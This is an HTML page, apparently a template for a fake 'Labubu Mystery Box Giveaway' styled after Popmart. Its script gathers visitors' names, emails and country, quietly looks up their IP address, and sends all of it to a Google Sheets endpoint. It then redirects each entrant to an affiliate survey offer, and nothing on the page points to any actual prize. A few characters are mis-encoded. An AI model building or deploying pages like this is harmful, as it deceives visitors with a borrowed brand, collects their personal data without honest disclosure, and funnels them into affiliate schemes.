<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Labubu Giveaway ‚Äì Popmart Style</title>

  <!-- Clean, Popmart-style font -->
  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;600&display=swap" rel="stylesheet">

  <style>
    :root {
      --accent: #ff5a5f;
      --text-dark: #111;
      --muted: #6b6b6b;
      --bg: #f8f8f8;
      --card: #ffffff;
      --radius: 14px;
      font-family: 'Noto Sans', 'Helvetica Neue', Arial, sans-serif;
    }

    body {
      margin: 0;
      background: var(--bg);
      color: var(--text-dark);
      font-family: inherit;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
      padding: 20px;
    }

    .container {
      width: 100%;
      max-width: 520px;
      background: var(--card);
      border-radius: var(--radius);
      box-shadow: 0 6px 20px rgba(0,0,0,0.08);
      padding: 28px 24px;
      text-align: center;
    }

    .hero img {
      width: 100%;
      border-radius: var(--radius);
      margin-bottom: 16px;
    }

    h1 {
      font-size: 28px;
      margin: 0 0 10px;
      font-weight: 600;
    }

    .lead {
      font-size: 15px;
      color: var(--muted);
      margin-bottom: 20px;
      line-height: 1.5;
    }

    label {
      font-size: 14px;
      text-align: left;
      display: block;
      margin-bottom: 6px;
      margin-top: 12px;
      color: var(--muted);
    }

    input, select {
      width: 100%;
      padding: 10px 12px;
      border: 1px solid #ddd;
      border-radius: 8px;
      font-size: 15px;
      background: #fafafa;
      margin-bottom: 6px;
    }

    input:focus, select:focus {
      outline: 2px solid var(--accent);
      border-color: var(--accent);
      background: #fff;
    }

    button {
      width: 100%;
      margin-top: 16px;
      padding: 12px;
      background: var(--accent);
      color: white;
      font-size: 16px;
      font-weight: bold;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.2s ease-in-out;
    }

    button:hover {
      background: #e14e52;
    }

    .success {
      background: #e7f8ed;
      color: #065f46;
      padding: 10px;
      border-radius: 8px;
      font-size: 14px;
      margin-bottom: 12px;
    }

    .cookie-banner {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      background: #fff;
      border-top: 1px solid #ddd;
      padding: 12px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 14px;
      z-index: 999;
      box-shadow: 0 -2px 8px rgba(0,0,0,0.05);
    }

    .cookie-banner button {
      background: var(--accent);
      color: white;
      padding: 8px 14px;
      border-radius: 6px;
      border: none;
      font-size: 14px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="hero">
      <img src="https://popmart-image-source-url-here/labubu-banner.jpg" alt="Labubu Giveaway">
    </div>
    <h1>üéÅ Labubu Mystery Box Giveaway</h1>
    <p class="lead">Sign up below for a chance to win a Labubu collectible! Limited-time event.</p>

    <div id="message" class="success" style="display:none"></div>

    <form id="giveaway-form">
      <label for="fullname">Full Name *</label>
      <input id="fullname" name="fullname" type="text" required>

      <label for="email">Email *</label>
      <input id="email" name="email" type="email" required>

      <label for="country">Country</label>
      <select id="country" name="country">
        <option value="">Select country</option>
        <option>United States</option>
        <option>Canada</option>
        <option>United Kingdom</option>
        <option>Australia</option>
      </select>

      <label style="margin-top:10px"><input type="checkbox" id="agree" required> I agree to the terms.</label>

      <button type="submit" id="submit-btn">Enter Giveaway</button>
    </form>
  </div>

  <!-- Cookie Banner -->
  <div class="cookie-banner" id="cookie-banner" style="display:none">
    <span>We use cookies to personalize your experience.</span>
    <button id="accept-cookies">Accept</button>
  </div>

  <script>
    (function(){
      const SURVEY_URL = "https://uplevelrewarded.com/aff_c?offer_id=2701&aff_id=150073";
      const WEB_APP_URL = "PASTE-YOUR-DEPLOYMENT-URL-HERE"; // <-- Google Sheets Script URL

      const form = document.getElementById('giveaway-form');
      const btn = document.getElementById('submit-btn');
      const messageEl = document.getElementById('message');

      // Cookie banner logic
      const cookieBanner = document.getElementById('cookie-banner');
      if(!localStorage.getItem('cookiesAccepted')) {
        cookieBanner.style.display = 'flex';
      }
      document.getElementById('accept-cookies').addEventListener('click', () => {
        localStorage.setItem('cookiesAccepted', 'yes');
        cookieBanner.style.display = 'none';
      });

      async function getIP(){
        try {
          const res = await fetch("https://api.ipify.org?format=json");
          const data = await res.json();
          return data.ip;
        } catch {
          return "Unavailable";
        }
      }

      form.addEventListener('submit', async function(e){
        e.preventDefault();
        btn.disabled = true;
        btn.textContent = "Submitting...";

        const ip = await getIP();

        fetch(WEB_APP_URL, {
          method: "POST",
          mode: "no-cors",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({
            fullname: form.fullname.value,
            email: form.email.value,
            country: form.country.value,
            ip
          })
        });

        messageEl.style.display = "block";
        messageEl.textContent = "Thanks! Redirecting...";
        
        setTimeout(()=>{
          window.location.href = SURVEY_URL;
        }, 1200);
      });
    })();
  </script>
</body>
</html>
